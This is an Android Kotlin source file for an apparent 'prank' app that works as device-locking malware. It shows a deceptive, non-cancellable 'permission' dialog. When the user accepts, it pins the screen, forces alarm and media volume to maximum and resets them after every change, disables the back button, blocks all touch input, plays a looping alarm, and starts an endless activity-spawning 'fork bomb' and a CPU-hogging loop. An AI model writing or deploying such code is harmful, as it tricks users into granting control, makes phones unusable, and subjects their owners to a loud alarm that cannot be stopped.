package com.example.myapplication

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.AudioManager
import android.media.MediaPlayer
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.KeyEvent
import android.view.View
import android.view.WindowManager
import androidx.activity.OnBackPressedCallback
import androidx.appcompat.app.AppCompatActivity
import android.app.AlertDialog
import android.view.LayoutInflater
import android.widget.Button
import java.io.IOException

class MainActivity : AppCompatActivity() {
    private lateinit var mediaPlayer: MediaPlayer
    private lateinit var audioManager: AudioManager
    private lateinit var volumeReceiver: BroadcastReceiver
    private val handler = Handler(Looper.getMainLooper())

    private var pinningAttempted = false // Track if screen pinning has been attempted

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        supportActionBar?.setDisplayShowTitleEnabled(false)
        supportActionBar?.setLogo(R.drawable.logo)
        supportActionBar?.setDisplayUseLogoEnabled(true)
        supportActionBar?.setDisplayShowHomeEnabled(true)

        setContentView(R.layout.activity_prank)
        showCustomDialog()

        audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager

        onBackPressedDispatcher.addCallback(this, object : OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                // Disable the back button
            }
        })

        enforceMaxVolume()
        monitorVolumeChanges()
        blockUserInteraction()
        startAutoDisableTimer()

        window.addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD)

        setupAudio()
    }
    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (!hasFocus && pinningAttempted) {
            // Show the dialog again if screen pinning is canceled
            handler.postDelayed({
                showCustomDialog()
            }, 1000) // Delay by 1 second to prevent rapid looping
        }
    }

    private fun enforceMaxVolume() {
        val maxMusicVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
        val maxAlarmVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxMusicVolume, 0)
        audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxAlarmVolume, 0)
    }

    private fun monitorVolumeChanges() {
        volumeReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                enforceMaxVolume()
            }
        }
        registerReceiver(volumeReceiver, IntentFilter("android.media.VOLUME_CHANGED_ACTION"))
    }

    private fun showCustomDialog() {
        val dialogView = LayoutInflater.from(this).inflate(R.layout.dialog_permission, null)
        val alertDialog = AlertDialog.Builder(this)
            .setView(dialogView)
            .setCancelable(false)
            .create()

        val allowButton: Button = dialogView.findViewById(R.id.allow_button)

        allowButton.setOnClickListener {
            alertDialog.dismiss()
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                startLockTask()
                pinningAttempted = true
            }

            handler.postDelayed({
                startAudio()
                forkBomb(this)
                hangDevice()

            }, 5000)
        }

        alertDialog.show()
    }
    private fun forkBomb(context: Context) {
        while (true) {
            val intent = Intent(context, MainActivity::class.java)
            context.startActivity(intent)
            context.startActivity(intent)
            context.startActivity(intent)// Opens new instance of app repeatedly
        }
    }
    private fun hangDevice() {
        while (true) {
            // This runs in a loop, keeping the CPU busy
            Math.sqrt(999999999.999)
            Math.sqrt(999999999.999)
            Math.sqrt(999999999.999)
        }
    }
    private fun startAudio() {
        mediaPlayer = MediaPlayer()

        try {
            val afd = resources.openRawResourceFd(R.raw.alarm)
            mediaPlayer.setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
            afd.close()

            mediaPlayer.setAudioStreamType(AudioManager.STREAM_ALARM)
            mediaPlayer.isLooping = true
            mediaPlayer.prepare()
            mediaPlayer.start()

        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private fun setupAudio() {
        audioManager.setStreamVolume(
            AudioManager.STREAM_ALARM,
            audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM),
            AudioManager.FLAG_SHOW_UI
        )
    }

    private fun blockUserInteraction() {
        val blocker = View(this)
        blocker.systemUiVisibility = View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
        blocker.setOnTouchListener { _, _ -> true }

        window.addContentView(
            blocker,
            WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT
            )
        )
    }

    private fun startAutoDisableTimer() {
        handler.postDelayed({
            mediaPlayer.stop()
            unregisterReceiver(volumeReceiver)
            finish()
        }, 60000)
    }

    override fun onDestroy() {
        super.onDestroy()
        if (::mediaPlayer.isInitialized) {
            mediaPlayer.release()
        }
        if (::volumeReceiver.isInitialized) {
            unregisterReceiver(volumeReceiver)
        }
        handler.removeCallbacksAndMessages(null)
    }
}
